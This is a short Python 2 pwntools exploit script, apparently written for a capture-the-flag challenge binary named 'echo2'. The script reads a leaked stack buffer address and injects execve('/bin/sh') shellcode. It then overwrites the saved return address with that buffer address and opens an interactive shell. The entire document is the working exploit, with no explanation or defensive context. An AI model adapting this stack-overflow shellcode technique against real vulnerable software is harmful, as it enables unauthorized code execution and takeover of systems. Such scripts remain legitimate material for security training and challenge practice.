#/bin/python2

from pwn import *
context.arch = "amd64"

p = process("./echo2")

p.recvuntil("I'm going to store your data at 0x")
buffer_address = int(p.recvline(keepends=False), 16)
print "Buffer address: " + hex(buffer_address)

string_address = buffer_address + 128

shellcode = asm("""
mov eax, SYS_execve
mov rdi, {}
xor rsi, rsi
xor rdx, rdx
syscall
""".format(buffer_address + 128))

#          BUFFER                       STACK PAD   RETURN ADDR
p.sendline(shellcode.ljust(128, 'A') + '/bin/sh\0' + p64(buffer_address));

p.interactive()


